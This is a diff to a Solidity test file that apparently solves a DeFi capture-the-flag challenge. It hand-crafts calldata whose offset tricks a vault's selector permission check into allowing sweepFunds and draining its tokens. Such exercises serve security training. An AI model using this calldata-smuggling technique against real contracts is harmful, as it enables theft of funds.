@@ -73,7 +73,47 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
+// Step 1: Create the execute() function selector (0x1cff79cd)
+        bytes4 executeSelector = bytes4(keccak256("execute(address,bytes)"));
+
+        // Step 2: Target address (the vault itself)
+        bytes memory targetAddress = abi.encode(address(vault));
+
+        // Step 3: Set offset for actionData to 0x80 (4 * 32 bytes from selector)
+        bytes memory bytesLocation = abi.encode(0x80);
+
+        // Step 4: Empty bytes where actionData length should be
+        bytes memory emptyBytes = abi.encode(0x0);
+
+        // Step 5: The withdraw selector that will be checked (0xd9caed12)
+        bytes4 withdrawSelector = bytes4(keccak256("withdraw(address,address,uint256)"));
         
+        // Step 6: Length of actual actionData (0x44 = 68 bytes = 4 + 32 + 32)
+        bytes memory bytesLength = abi.encode(0x44);
+
+        // Step 7: The actual sweepFunds selector we want to execute
+        bytes4 sweepSelector = bytes4(keccak256("sweepFunds(address,address)"));
+
+        // Step 8: Parameters for sweepFunds
+        bytes memory sweepParams = abi.encode(recovery, address(token));
+
+        // Step 9: Construct the full payload
+        bytes memory payload = bytes.concat(
+            executeSelector,
+            targetAddress,
+            bytesLocation,
+            emptyBytes,
+            withdrawSelector,
+            bytes28(0), // padding after withdraw selector
+            bytesLength,
+            sweepSelector,
+            sweepParams
+        );
+
+        // Step 10: Execute the call
+        (bool success,) = address(vault).call(payload);
+        require(success, "Attack failed");
+   
     }
 
     /**
